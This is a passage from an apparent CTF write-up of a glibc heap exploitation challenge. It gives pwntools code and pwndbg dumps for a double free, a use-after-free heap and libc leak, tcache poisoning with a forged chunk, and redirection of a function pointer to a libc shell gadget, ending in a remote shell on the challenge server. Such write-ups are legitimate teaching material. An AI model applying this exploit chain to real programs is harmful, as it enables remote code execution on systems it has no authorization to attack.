</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span> <span class="c1"># Double free</span>
</span></span><span class="line"><span class="cl">    <span class="n">free_student</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">print_student</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">heap_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Leak heap address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Heap after creating new student named <code>aaaaaaaaaaaaaaaa</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/30gx 0x21a0260-0x10
</span></span><span class="line"><span class="cl">0x21a0250:	0x0000000000000000	0x0000000000000021 &lt;- chunk size metadata
</span></span><span class="line"><span class="cl">0x21a0260:	0x6161616161616161	0x6161616161616161 &lt;- chunk data
</span></span><span class="line"><span class="cl">0x21a0270:	0x0000000000000000	0x0000000000020d91
</span></span><span class="line"><span class="cl">0x21a0280:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0290:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02a0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02b0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02c0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02d0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02e0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02f0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0300:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0310:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0320:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0330:	0x0000000000000000	0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>First free</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/30gx 0x21a0260-0x10
</span></span><span class="line"><span class="cl">0x21a0250:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0260:	0x0000000000000000	0x6161616161616161 &lt;- This chunk become tcache_entry, and the first <span class="m">8</span> bytes point to the next tcache_entry, which is null because only <span class="m">1</span> entry <span class="k">for</span> now
</span></span><span class="line"><span class="cl">0x21a0270:	0x0000000000000000	0x0000000000020d91
</span></span><span class="line"><span class="cl">0x21a0280:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0290:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02a0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02b0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02c0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02d0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02e0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02f0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0300:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0310:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0320:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0330:	0x0000000000000000	0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Free it again</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/30gx 0x21a0260-0x10
</span></span><span class="line"><span class="cl">0x21a0250:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0260:	0x00000000021a0260	0x6161616161616161 &lt;- Because of the double free, the tcache_entry single linked list create a loop
</span></span><span class="line"><span class="cl">0x21a0270:	0x0000000000000000	0x0000000000020d91
</span></span><span class="line"><span class="cl">0x21a0280:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0290:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02a0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02b0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02c0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02d0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02e0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a02f0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0300:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0310:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0320:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x21a0330:	0x0000000000000000	0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, with UAF, we can print student info, which point to the <code>tcache_entry</code>, and we successfully leak the heap_address (via print student info menu).</p>
<p>After that don&rsquo;t forget to empty the tcache. Set the <code>tcache_entry-&gt;next pointer</code> to null, so that when we create a new student, the tcache will be empty (because the next pointer is null). We can use menu 4 (edit student) to null it, because the <code>student_pointer</code> still point to our chunk data.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Set tcache[0x20] to empty</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_student</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="c1"># Make the current tcache_entry-&gt;next to null</span>
</span></span><span class="line"><span class="cl"><span class="n">new_student</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># The malloc will use the cached chunk, and because the next is null, tcache[0x20] is now empty</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now our tcache is empty, and we are ready to create our forged chunk.</p>
<h4 id="create-forged-chunk">Create forged chunk</h4>
<p>After finding the heap address, we can create our <code>0x91</code> forged chunk (by creating new student), and then later with double free + UAF, we can overwrite the pointer of tcache to point to our forged chunk. We just need to create a lot of chunk (via new student menu) where the name last byte is <code>0x91</code>. I create new student 6 times, so that the next of my fake chunk is not the wilderness (because if it is, it will get consolidated).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Populate heap because we will forge the chunk to 0x90 size (1 alloc = 0x20 bytes)
</span></span><span class="line"><span class="cl"># Make sure the next of our forged chunk is not the wilderness
</span></span><span class="line"><span class="cl">for i in range(6):
</span></span><span class="line"><span class="cl">    new_student(p64(0) + p64(0x91))
</span></span></code></pre></td></tr></table>
</div>
</div><p>Heap structure after that:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/30gx 0x21a0260-0x10
</span></span><span class="line"><span class="cl">0x21a0250:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0260:	0x6161616161616161	0x616161616161610a -&gt; Leaked heap address
</span></span><span class="line"><span class="cl">0x21a0270:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0280:	0x0000000000000000	0x0000000000000091 --
</span></span><span class="line"><span class="cl">0x21a0290:	0x0000000000000000	0x0000000000000021   <span class="p">|</span>
</span></span><span class="line"><span class="cl">0x21a02a0:	0x0000000000000000	0x0000000000000091   <span class="p">|</span>
</span></span><span class="line"><span class="cl">0x21a02b0:	0x0000000000000000	0x0000000000000021   <span class="p">|</span>
</span></span><span class="line"><span class="cl">0x21a02c0:	0x0000000000000000	0x0000000000000091   <span class="p">|</span>-&gt; This is our fake chunk with size 0x91
</span></span><span class="line"><span class="cl">0x21a02d0:	0x0000000000000000	0x0000000000000021   <span class="p">|</span>
</span></span><span class="line"><span class="cl">0x21a02e0:	0x0000000000000000	0x0000000000000091   <span class="p">|</span>
</span></span><span class="line"><span class="cl">0x21a02f0:	0x0000000000000000	0x0000000000000021   <span class="p">|</span>
</span></span><span class="line"><span class="cl">0x21a0300:	0x0000000000000000	0x0000000000000091 --
</span></span><span class="line"><span class="cl">0x21a0310:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0320:	0x0000000000000000	0x0000000000000091 -&gt; student_pointer is currently pointing to this chunk
</span></span><span class="line"><span class="cl">0x21a0330:	0x0000000000000000	0x0000000000020cd1
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="make-student_pointer-to-point-the-forged-chunk">Make student_pointer to point the forged chunk</h4>
<p>Now we have prepare our forged chunk, now we need to make a pointer point to the chunk (<code>leaked_heap_address+0x30</code>) and then free it. The idea is to:</p>
<ul>
<li>Free the <code>student_pointer</code>. So that <code>tcache[0x20] = last_chunk</code></li>
<li>Call edit student to overwrite the <code>tcache_entry-&gt;next</code> to our forged chunk (<code>leaked_heap_address+0x30</code>), so that <code>tcache[0x20] = last_chunk-&gt;heap_address+0x30</code></li>
<li>Create new student. This will be allocated to our last chunk, and <code>tcache[0x20]</code> will point to <code>heap_address+0x30</code></li>
<li>Create new student again. This student will be allocated to <code>heap_address+0x30</code> and now we have a pointer to our forged chunk that is ready to be freed.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Free the last chunk</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite it with our desired address (heap_address + 0x30)</span>
</span></span><span class="line"><span class="cl"><span class="n">free_student</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_student</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_address</span><span class="o">+</span><span class="mh">0x30</span><span class="p">))</span> <span class="c1"># tcache[0x20] = last_chunk-&gt;heap_address+0x30</span>
</span></span><span class="line"><span class="cl"><span class="n">new_student</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Allocate it to last chunk. Now, tcache[0x20] = heap_address+0x30</span>
</span></span><span class="line"><span class="cl"><span class="n">new_student</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Allocate it to heap_address+0x30. Now, tcache[0x20] = empty and student_pointer point to heap_address+0x30</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Heap structure after that:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/30gx 0x21a0260-0x10
</span></span><span class="line"><span class="cl">0x21a0250:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0260:	0x6161616161616161	0x616161616161610a
</span></span><span class="line"><span class="cl">0x21a0270:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0280:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a0290:	0x6161616161616161	0x000000000000000a &lt;- student_pointer
</span></span><span class="line"><span class="cl">0x21a02a0:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a02b0:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a02c0:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a02d0:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a02e0:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a02f0:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0300:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a0310:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0320:	0x6161616161616161	0x000000000000000a
</span></span><span class="line"><span class="cl">0x21a0330:	0x0000000000000000	0x0000000000020cd1
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="leak-libc-base-address">Leak libc base address</h4>
<p>Now we have a pointer to our fake chunk, we are ready to leak the libc address of <code>main_arena</code>. We just need to free it 7 times (to fulfill <code>tcache[0x90]</code> bin), and then free it one more time, to make our chunk as the cache of unsorted bin.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">free_student</span><span class="p">()</span> <span class="c1"># Free it 7 times to fulfill tcache[0x90]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Because tcache[0x90] is full, the next free will put the cached chunk into unsorted bins</span>
</span></span><span class="line"><span class="cl"><span class="n">free_student</span><span class="p">()</span> <span class="c1"># Cache goes to unsorted bins, and its pointer will point to the main_arena</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now our pointer is pointing to the main_arena. We can leak the libc address by using the print menu,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># because the student variable is still a pointer to the freed chunk</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">print_student</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">main_arena</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main_arena&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_leaked</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="c1"># We got main_arena+0x60</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leaked</span> <span class="o">-</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="mh">0x60</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Leak libc base address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Bins and Heap structure before the 8th free:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; bins
</span></span><span class="line"><span class="cl">tcachebins
</span></span><span class="line"><span class="cl">0x90 <span class="o">[</span>  7<span class="o">]</span>: 0x21a0290  0x21a0290
</span></span><span class="line"><span class="cl">fastbins
</span></span><span class="line"><span class="cl">0x20: 0x0
</span></span><span class="line"><span class="cl">0x30: 0x0
</span></span><span class="line"><span class="cl">0x40: 0x0
</span></span><span class="line"><span class="cl">0x50: 0x0
</span></span><span class="line"><span class="cl">0x60: 0x0
</span></span><span class="line"><span class="cl">0x70: 0x0
</span></span><span class="line"><span class="cl">0x80: 0x0
</span></span><span class="line"><span class="cl">unsortedbin
</span></span><span class="line"><span class="cl">all: 0x0
</span></span><span class="line"><span class="cl">smallbins
</span></span><span class="line"><span class="cl">empty
</span></span><span class="line"><span class="cl">largebins
</span></span><span class="line"><span class="cl">empty
</span></span><span class="line"><span class="cl">pwndbg&gt; x/30gx 0x21a0260-0x10
</span></span><span class="line"><span class="cl">0x21a0250:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0260:	0x6161616161616161	0x616161616161610a
</span></span><span class="line"><span class="cl">0x21a0270:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0280:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a0290:	0x00000000021a0290	0x000000000000000a &lt;- student_pointer pointed address
</span></span><span class="line"><span class="cl">0x21a02a0:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a02b0:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a02c0:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a02d0:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a02e0:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a02f0:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0300:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a0310:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0320:	0x6161616161616161	0x000000000000000a
</span></span><span class="line"><span class="cl">0x21a0330:	0x0000000000000000	0x0000000000020cd1
</span></span></code></pre></td></tr></table>
</div>
</div><p>After the 8th free:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; bins
</span></span><span class="line"><span class="cl">tcachebins
</span></span><span class="line"><span class="cl">0x90 <span class="o">[</span>  7<span class="o">]</span>: 0x21a0290  0x7f7bd939aca0 <span class="o">(</span>main_arena+96<span class="o">)</span>  0x21a0330  0x0
</span></span><span class="line"><span class="cl">fastbins
</span></span><span class="line"><span class="cl">0x20: 0x0
</span></span><span class="line"><span class="cl">0x30: 0x0
</span></span><span class="line"><span class="cl">0x40: 0x0
</span></span><span class="line"><span class="cl">0x50: 0x0
</span></span><span class="line"><span class="cl">0x60: 0x0
</span></span><span class="line"><span class="cl">0x70: 0x0
</span></span><span class="line"><span class="cl">0x80: 0x0
</span></span><span class="line"><span class="cl">unsortedbin
</span></span><span class="line"><span class="cl">all: 0x21a0280  0x7f7bd939aca0 <span class="o">(</span>main_arena+96<span class="o">)</span>  0x21a0280
</span></span><span class="line"><span class="cl">smallbins
</span></span><span class="line"><span class="cl">empty
</span></span><span class="line"><span class="cl">largebins
</span></span><span class="line"><span class="cl">empty
</span></span><span class="line"><span class="cl">pwndbg&gt; x/30gx 0x21a0260-0x10
</span></span><span class="line"><span class="cl">0x21a0250:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0260:	0x6161616161616161	0x616161616161610a
</span></span><span class="line"><span class="cl">0x21a0270:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0280:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a0290:	0x00007f7bd939aca0	0x00007f7bd939aca0 &lt;- student_pointer pointed address and now its contains libc address of the main_arena
</span></span><span class="line"><span class="cl">0x21a02a0:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a02b0:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a02c0:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a02d0:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a02e0:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a02f0:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x21a0300:	0x0000000000000000	0x0000000000000091
</span></span><span class="line"><span class="cl">0x21a0310:	0x0000000000000090	0x0000000000000020
</span></span><span class="line"><span class="cl">0x21a0320:	0x6161616161616161	0x000000000000000a
</span></span><span class="line"><span class="cl">0x21a0330:	0x0000000000000000	0x0000000000020cd1
</span></span></code></pre></td></tr></table>
</div>
</div><p>With UAF, simply print the student info, and because the student pointer is currently pointing to the leaked libc, it will print the libc address. We finally got the leaked libc address.</p>
<h4 id="final-step">Final step</h4>
<p>After that, we can reuse the first pitfall solution, but instead of putting the <code>getFlag</code> address, we put our shell_address ready to be executed</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shell_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc_shell</span>
</span></span><span class="line"><span class="cl"><span class="n">new_admin</span><span class="p">()</span> <span class="c1"># Create new admin</span>
</span></span><span class="line"><span class="cl"><span class="n">free_admin</span><span class="p">()</span> <span class="c1"># Free it</span>
</span></span><span class="line"><span class="cl"><span class="n">new_student</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">shell_addr</span><span class="p">))</span> <span class="c1"># Create new student</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Because of the tcache, now variable admin and student are pointing to the same chunk,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># and the chunk data (last 8 bytes) that can be called by the admin is our shell_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">get_shell</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Executing the full solution will give us shell and we can read the real flag.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">    Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
</span></span><span class="line"><span class="cl">    Stack:    Canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Opening connection to 35.246.134.224 on port 30532: Done
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Leak heap address: 0x1de0260
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Leak libc base address: 0x7f8af6ff1000
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
</span></span><span class="line"><span class="cl">$ ls
